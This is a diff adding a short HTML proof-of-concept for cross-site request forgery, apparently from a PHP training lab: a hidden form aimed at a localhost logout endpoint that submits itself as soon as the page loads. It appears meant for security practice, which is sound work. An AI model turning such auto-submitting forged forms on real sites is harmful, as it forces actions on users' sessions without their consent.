@@ -1,0 +1,7 @@
+<form action="http://localhost/php_training/logout.php" method="POST">
+    <input type="hidden" name="id" value="1">
+    <button type="submit">Fake CSRF Logout</button>
+</form>
+<script>
+    document.forms[0].submit();
+</script>
